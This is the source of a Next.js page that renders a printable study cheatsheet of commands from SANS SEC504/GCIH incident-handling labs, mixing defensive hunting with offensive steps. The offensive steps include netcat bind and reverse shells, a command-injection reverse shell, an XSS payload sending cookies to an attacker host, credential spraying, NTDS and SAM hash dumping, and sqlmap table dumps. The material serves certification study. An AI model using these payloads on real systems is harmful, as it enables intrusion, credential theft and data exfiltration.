import { Metadata } from "next";
import PrintableCheatsheet, { type CheatRow, type CheatSection } from "../../../components/PrintableCheatsheet";

export const metadata: Metadata = {
  title: "GCIH (SEC504) Lab Index",
  description: "Command index for the SANS SEC504 / GIAC GCIH hands-on labs, grouped by lab. Printable exam reference.",
  robots: { index: false, follow: false },
};

// Helper so the rows stay readable: labTitle carries the SEC504 lab number.
function r(command: string, purpose: string, flags: string, lab: string): CheatRow {
  return { command, purpose, flags, labSlug: "", labTitle: lab };
}

/**
 * Hand-authored from the SEC504 lab screenshots. One section per lab, in
 * course order. This is a study index for the GCIH exam, not auto-derived
 * from the site's lab data (most SEC504 labs are not published as writeups).
 */
const SECTIONS: CheatSection[] = [
  {
    name: "Lab 1.1 — PowerShell Live Investigation",
    rows: [
      r("Get-Process lsass | Select-Object -Property *", "Dump every property of a known-good process", "Select -Property *: full object; learn the shape before filtering", "Lab 1.1"),
      r("Get-Process | Select Path,Name,Id | Where-Object -Property Path -Like \"*temp*\"", "Find processes running out of TEMP", "Where -Like \"*temp*\": case-insensitive wildcard on Path", "Lab 1.1"),
      r("Get-NetTCPConnection | Select LocalAddress,LocalPort,State,OwningProcess", "Active TCP connections mapped to a PID", "OwningProcess is the PID; pivot to Get-Process -Id", "Lab 1.1"),
      r("Get-Process | Where-Object -Property Id -eq 1672 | Stop-Process", "Kill a malicious process by PID", "Pipe the filtered object straight into Stop-Process", "Lab 1.1"),
      r("Get-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"", "Hunt Run-key persistence", "Check HKLM + HKCU, Run + RunOnce (4 keys total)", "Lab 1.1"),
      r("Remove-ItemProperty -Path HKCU:...\\Run -Name Calcache ; Remove-Item $env:temp\\calcache.exe", "Eradicate persistence + binary", "Remove the autorun value AND the dropped file", "Lab 1.1"),
      r("Compare-Object $servicebaseline $servicesnow", "Diff current services vs saved baseline", "SideIndicator <= only in baseline, => only in current", "Lab 1.1"),
    ],
  },
  {
    name: "Lab 1.2 — Network Beacon Detection with RITA",
    rows: [
      r("./rita.sh import -l log/ ~/labs/falsimentis/", "Import Zeek logs into RITA", "-l log/: write import log; last arg is the Zeek log dir", "Lab 1.2"),
      r("./rita.sh view falsimentis", "Open the RITA UI; read the Beacon score column", "High beacon score = regular C2 callback interval", "Lab 1.2"),
      r("grep lolcats.org dns.log | head -1", "Cross-check a suspected C2 domain in dns.log", "Confirm/refute the beacon against raw Zeek DNS", "Lab 1.2"),
      r("gedit config.hjson  (safelist Canonical NTP)", "Tune out known-good beacons", "Safelist legit periodic traffic to cut false positives", "Lab 1.2"),
      r("./rita.sh delete -ni falsimentis", "Delete + re-import so new config applies", "-ni: no interactive confirm; config changes need re-import", "Lab 1.2"),
      r("grep www1-google-analytics.com access.log", "Find DNS-spoofed C2 in proxy log", "Typosquat domain proxied through the web gateway", "Lab 1.2"),
      r("awk '/www1-google-analytics.com/ {print $3}' access.log | sort -u", "Enumerate every compromised internal host", "$3 = client IP; sort -u for the unique victim list", "Lab 1.2"),
    ],
  },
  {
    name: "Lab 1.3 — Malware Analysis (AnalyticsInstaller.exe)",
    rows: [
      r("Get-FileHash -Algorithm SHA256 .\\AnalyticsInstaller.exe", "Hash the sample for IOC lookup", "-Algorithm MD5 / SHA256; hash before detonating", "Lab 1.3"),
      r("C:\\tools\\Sysinternals\\strings.exe -n 10 .\\AnalyticsInstaller.exe", "Pull readable strings / IOCs", "-n 10: min length 10 to cut noise", "Lab 1.3"),
      r("Regshot (1st shot) → detonate → Regshot (2nd shot) → Compare", "Registry-diff a detonation", "Shows dropped Run keys + scheduled tasks", "Lab 1.3"),
      r("Get-ScheduledTask", "Confirm the persistence task after detonation", "Malware scheduled-task persistence shows here", "Lab 1.3"),
      r("Get-Content C:\\Windows\\SysWOW64\\AnalyticsBackup.bat", "Read the dropped batch payload", "The .bat is the second-stage launcher", "Lab 1.3"),
      r("Procmon: filter Process Name is AnalyticsInstaller.exe", "Trace file/registry/process activity", "Find the Process Create → encoded PowerShell command line", "Lab 1.3"),
    ],
  },
  {
    name: "Lab 1.4 — AI-Assisted Incident Handling",
    rows: [
      r("goaichat", "Start the local AI stack (Ollama chat)", "Offline model; no data leaves the lab host", "Lab 1.4"),
      r("cat ~/labs/falsimentis/analytics-backup.bat", "Load the obfuscated sample to deobfuscate", "Feed to the model for step-by-step decode", "Lab 1.4"),
      r("Prompt: deobfuscate + decode base64 PowerShell", "Turn encoded command line into readable steps", "One command per line, then extract IOCs", "Lab 1.4"),
      r("gedit ~/labs/falsimentis/IRplaybook.txt", "Set an expert-IR system prompt", "Constrain the model to analytical IR output", "Lab 1.4"),
    ],
  },
  {
    name: "Lab 2.1 — Nmap Discovery & Enumeration",
    rows: [
      r("nmap -n -sn 172.30.0.1-254   (then again with sudo)", "Host discovery; privileged sweep uses ARP", "sudo -sn finds hosts that ignore ICMP/TCP probes", "Lab 2.1"),
      r("sudo nmap -n -sT -p 1-65535 172.30.0.20", "Full-range TCP connect scan", "-sT connect scan; -p 1-65535 beats the default top-1000", "Lab 2.1"),
      r("sudo nmap -n -sT -sV -p 80,443,2430,3306 172.30.0.20", "Version-detect open ports", "-sV revealed Dropbear SSH hiding on 2430", "Lab 2.1"),
      r("sudo nmap -n -sT -p 27017 -sC 172.30.0.26", "Default NSE scripts vs a service", "-sC ran mongodb-databases with no auth", "Lab 2.1"),
      r("... --script mongodb-databases  |  -oN nmap_mongodb_scan.txt", "Targeted NSE script; save output", "--script <name> for one script; -oN writes the report file", "Lab 2.1"),
      r("sudo nmap -n -sT -sC -p 139,445 172.30.0.114", "SMB NSE (nbstat, smb2-security-mode)", "Caught signing 'enabled but not required' (relay risk)", "Lab 2.1"),
    ],
  },
  {
    name: "Lab 2.2 — Cloud (masscan + TLS attribution)",
    rows: [
      r("masscan -p 443 --rate 10000 -oL simcloud.txt 10.200.0.0/16", "Sweep a /16 cloud range fast", "--rate packets/sec; -oL list output; SYN stealth", "Lab 2.2"),
      r("awk '/open/ {print $4}' simcloud.txt > simcloud-targets.txt", "Extract just the live IPs", "$4 = IP in masscan -oL lines", "Lab 2.2"),
      r("tls-scan --port=443 --cacert=/opt/tls-scan/ca-bundle.crt -o out.json < targets.txt", "Grab TLS certs for each IP", "Reads targets on stdin; JSON out", "Lab 2.2"),
      r("jq '.ip + \" \" + .certificateChain[].subjectCN' simcloud-tlsinfo.json", "Map anonymous cloud IPs to owners", "Cloud IPs have no DNS; cert subjectCN = attribution", "Lab 2.2"),
      r("jq ... | grep falsimentis", "Isolate the target org's asset", "10.200.74.2 = downloads.falsimentis.com", "Lab 2.2"),
      r("sudo nmap -sT -sV -p 443 --script http-enum 10.200.74.2", "Enumerate the found web host", "http-enum found /robots.txt + /css/ dir listing", "Lab 2.2"),
    ],
  },
  {
    name: "Lab 2.3 — SMB Security",
    rows: [
      r("smbclient -L //172.30.0.22 -U tdoudney%Falsimentis123", "List shares (creds inline as user%pass)", "SMB1 workgroup listing failing is normal here", "Lab 2.3"),
      r("smbclient //172.30.0.22/IT -U tdoudney%Falsimentis123", "Connect to a share; ls / get files", "Found logon.cmd (drive maps) + netssh.cmd (proxy)", "Lab 2.3"),
      r("tar c tdoudney-home.tar   (inside smbclient)", "Exfil a whole directory in one command", "smbclient's tar c streams the share to a local tarball", "Lab 2.3"),
      r("cat backup.ps1.OLD", "Read the leaked stale script", "Hardcoded 'Clippers2022' for falsimentis.com\\csparkes", "Lab 2.3"),
      r("smbclient //172.30.0.22/CustomerDev -U csparkes%Clippers2022", "Pivot with the stolen credential", "Lateral move to a share holding a 33MB db backup", "Lab 2.3"),
    ],
  },
  {
    name: "Lab 2.4 — Hayabusa (EVTX threat hunting)",
    rows: [
      r(".\\hayabusa.exe csv-timeline --directory C:\\Tools\\win10evtx\\ -o out.csv --no-color", "Build a Sigma-based detection timeline", "Scan wizard picks rule set; sysmon rules add coverage", "Lab 2.4"),
      r("(scan wizard) rule set 5 = all event+alert rules", "Load the full rule set", "209 deprecated / 45 unsupported / 12 noisy excluded", "Lab 2.4"),
      r("Read Results Summary: high/med/low/info counts", "Triage by severity", "3 high alerts, all log-clearing (anti-forensics)", "Lab 2.4"),
      r("Timeline Explorer: drag column header to group", "Group the CSV by Level then Rule Title", "Collapses 2,989 rows into 33 unique detections", "Lab 2.4"),
      r(".\\hayabusa.exe logon-summary   /   eid-metrics", "Quick logon + event-ID stats", "Fast pivots without the full timeline", "Lab 2.4"),
    ],
  },
  {
    name: "Lab 2.5 — Netcat",
    rows: [
      r("nc -l -p 2222   ↔   nc 10.10.75.1 2222", "Listener / client chat", "-l listen, -p port; same syntax Linux + Windows", "Lab 2.5"),
      r("Get-Content .\\text.txt | nc -l -p 1234   ↔   nc 10.10.0.1 1234 > out.txt", "File transfer over nc", "Sender pipes in; receiver redirects to a file", "Lab 2.5"),
      r("nc -l -p 7777 -e /bin/sh   (Linux)  /  nc <ip> 8888 -e cmd.exe  (Win)", "Bind shell", "-e binds a shell to the connection", "Lab 2.5"),
      r("mkfifo namedpipe ; nc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe", "Bidirectional relay / pivot", "FIFO makes the relay two-way; launders source IP", "Lab 2.5"),
      r("nc -vvv -z -w3 172.30.0.55 80", "Port check through the pivot", "-z zero-I/O scan, -w3 timeout, -vvv verbose", "Lab 2.5"),
    ],
  },
  {
    name: "Lab 3.1 — Legba (password attacks)",
    rows: [
      r("legba -C credentials.txt -T http://172.30.0.12/ http.basic", "Credential stuffing (combo list)", "-C combo user:pass; protocol is the last arg", "Lab 3.1"),
      r("legba -U root -P 10k-most-common.txt -T 172.30.0.64 mysql", "Single-user dictionary attack", "-U user, -P wordlist; found root:changeme", "Lab 3.1"),
      r("legba -U userlist.txt -P Falsimentis123 -T 172.30.0.155 smb", "Password SPRAY (one pass, many users)", "-U list + -P single = spray; stays under lockout", "Lab 3.1"),
      r("legba -U admin -P tiksight -T 172.30.0.64 mysql", "Credential-reuse check", "Verify a found cred against another service", "Lab 3.1"),
    ],
  },
  {
    name: "Lab 3.3 — Hashcat",
    rows: [
      r("hashcat slingshot.hashes --identify", "Identify candidate hash modes", "descrypt 1500 / md5crypt 500 / sha256/512crypt 7400/1800", "Lab 3.3"),
      r("hashcat -a 0 -m 1500 slingshot.hashes /usr/share/wordlists/passwords.txt", "Dictionary attack (-a 0)", "-m mode, -a 0 straight wordlist", "Lab 3.3"),
      r("hashcat -m 1500 slingshot.hashes --show --username", "Show cracked hashes with usernames", "--show reads potfile; --left lists uncracked", "Lab 3.3"),
      r("secretsdump.py -system registry/SYSTEM -ntds \"Active Directory/ntds.dit\" LOCAL -outputfile w99", "Extract NTLM hashes from NTDS.dit", "LOCAL parse; -history for password history", "Lab 3.3"),
      r("sed -i '/\\$/d' w99.ntds", "Strip machine accounts before cracking", "Machine account names end in $", "Lab 3.3"),
      r("hashcat -a 3 w99.ntds ?u?l?l?l?l?l?l?d", "Mask attack against a known pattern", "-a 3 mask; ?u upper ?l lower ?d digit", "Lab 3.3"),
      r("hashcat -a 0 w99.ntds passwords.txt -r /opt/hashcat/rules/best64.rule", "Rule-based attack (best value)", "-r rules turned 44k words into 3.4M candidates in 4s", "Lab 3.3"),
    ],
  },
  {
    name: "Lab 3.4 — Metasploit",
    rows: [
      r("search type:exploit psexec", "Find modules by keyword/type", "type:exploit / platform:windows filters", "Lab 3.4"),
      r("use exploit/windows/smb/psexec ; info", "Select a module; read options + targets", "psexec = authenticated user code execution", "Lab 3.4"),
      r("set RHOSTS / SMBUser / SMBPass / LHOST ; exploit", "Configure and run", "Valid creds ARE the exploit; opens a session", "Lab 3.4"),
      r("background ; sessions ; sessions 1", "Manage Meterpreter sessions", "Backgroundable + re-enterable by ID", "Lab 3.4"),
      r("getuid ; getpid ; sysinfo ; ps", "Situational awareness in Meterpreter", "getuid → NT AUTHORITY\\SYSTEM", "Lab 3.4"),
      r("migrate -N lsass.exe", "Move into a stable process", "Also fixes arch (x86→x64) and survives", "Lab 3.4"),
      r("hashdump", "Dump local SAM NTLM hashes", "31d6cfe0... = the empty-password hash", "Lab 3.4"),
    ],
  },
  {
    name: "Lab 4.1 — IDOR / Forced Browsing",
    rows: [
      r("curl http://support.falsimentis.com/robots.txt", "Read robots.txt as a map of hidden paths", "Disallow entries point at /admin, /singlestatus", "Lab 4.1"),
      r("ffuf -w combined_words.txt -u http://host/FUZZ", "Directory / content discovery", "FUZZ marks the injection point; default status matcher", "Lab 4.1"),
      r("curl -v http://host/builds/build.log", "Read an exposed dir-listing artifact", "Docker build log leaked installed packages", "Lab 4.1"),
      r("seq -w 0 9999 | ffuf -w - -u http://host/chatlogs/chatlog-FUZZ.txt -fc 500", "Enumerate sequential object IDs", "-w - reads stdin; -fc 500 filters the baseline error", "Lab 4.1"),
      r("curl http://host/chatlogs/chatlog-2305.txt", "Retrieve another user's object", "Predictable ID + no auth check = IDOR", "Lab 4.1"),
    ],
  },
  {
    name: "Lab 4.2 — Command Injection",
    rows: [
      r("?target=-h", "Argument injection probe (harmless)", "Prints fping usage → input reaches the command line", "Lab 4.2"),
      r("?target=-z || id", "Command injection via failure operator", "Invalid -z forces fping to fail; || runs id → uid=0(root)", "Lab 4.2"),
      r("?target=-z || ls   /   -z || which nc", "Enumerate the app dir + available tools", "Found db.sqlite3, source, and /usr/bin/nc", "Lab 4.2"),
      r("?target=-z || nc 10.10.75.1 4444 -e /bin/sh", "Reverse shell out of the injection", "Attacker runs nc -l -v -p 4444 first", "Lab 4.2"),
      r("sqlite3 db.sqlite3 \".dump\"", "Exfil the local DB from the shell", "Full schema + chatbot training data", "Lab 4.2"),
    ],
  },
  {
    name: "Lab 4.3 — Cross-Site Scripting (Stored)",
    rows: [
      r("<field>Lorezo<hr>", "Probe each field with a harmless tag", "Rendered rule = injectable; literal text = escaped", "Lab 4.3"),
      r("email: lorenzo@gmail.com<script>alert(1)</script>", "Confirm script execution", "Test EVERY field; email was unescaped, name was not", "Lab 4.3"),
      r("php cookiecatcher/index.php  (file_put_contents cookies.log)", "Stand up a cookie/exfil catcher", "php -S 0.0.0.0:8080 serves it", "Lab 4.3"),
      r("<script>document.location=\"http://10.10.75.1:8080/?\"+document.cookie</script>", "Steal the victim's session token", "Second IP in the log = the SME analyst (stored XSS)", "Lab 4.3"),
      r("curl http://host/admin/ -b authtoken=<stolen>", "Replay the stolen cookie", "-b sends the cookie; opens the real admin panel", "Lab 4.3"),
    ],
  },
  {
    name: "Lab 4.4 — SQL Injection",
    rows: [
      r("?search=RAG'", "Manual confirmation probe", "Single quote → MariaDB 1064 syntax error", "Lab 4.4"),
      r("sqlmap -u \"http://host/kb?entityid=3487&search=RAG\"", "Automated detection", "Tests both params; only 'search' is injectable", "Lab 4.4"),
      r("sqlmap -u \"...\" --dbs", "Enumerate databases", "→ information_schema, support", "Lab 4.4"),
      r("sqlmap -u \"...\" -D support --tables", "Enumerate tables", "→ chat, contact, kb, tickets, users", "Lab 4.4"),
      r("sqlmap -u \"...\" -D support -T users --dump", "Dump a table", "Cracked hashes inline; 12 users w/ roles + password hashes", "Lab 4.4"),
    ],
  },
  {
    name: "GCIH exam quick reference",
    rows: [
      r("Incident Handling 6 steps", "PICERL", "Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned", "Reference"),
      r("Attack phases", "MITRE-style kill chain", "Recon → Weaponize/Deliver → Exploit → Install → C2 → Actions on Objectives", "Reference"),
      r("nc bind vs reverse", "-e binds a shell", "Bind = listener on victim; reverse = victim connects out (beats inbound firewall)", "Reference"),
      r("Password attack types", "Know the distinction", "Guessing/online vs cracking/offline; dictionary vs brute vs mask vs rule vs spray", "Reference"),
      r("aad3b435b51404eeaad3b435b51404ee", "Empty LM hash", "Seeing it everywhere = LM disabled (good)", "Reference"),
      r("31d6cfe0d16ae931b73c59d7e0c089c0", "Empty NTLM hash", "Blank-password NTLM hash", "Reference"),
      r("Web attack sinks", "OWASP mapping", "IDOR=access control, cmd-injection=OS command, XSS=output encoding, SQLi=parameterization", "Reference"),
      r("SMB signing 'enabled, not required'", "Relay-exposed", "MITM can strip optional signing → SMB relay", "Reference"),
    ],
  },
];

export default function GcihIndexPage() {
  const total = SECTIONS.reduce((n, s) => n + s.rows.length, 0);
  return (
    <PrintableCheatsheet
      sections={SECTIONS}
      total={total}
      title="GCIH (SEC504) Lab Index"
      subtitle={`${total} commands across all 16 SEC504 labs. Print landscape, 8.5pt. One card per lab, in course order.`}
      pdfName="gcih-sec504-lab-index.pdf"
    />
  );
}
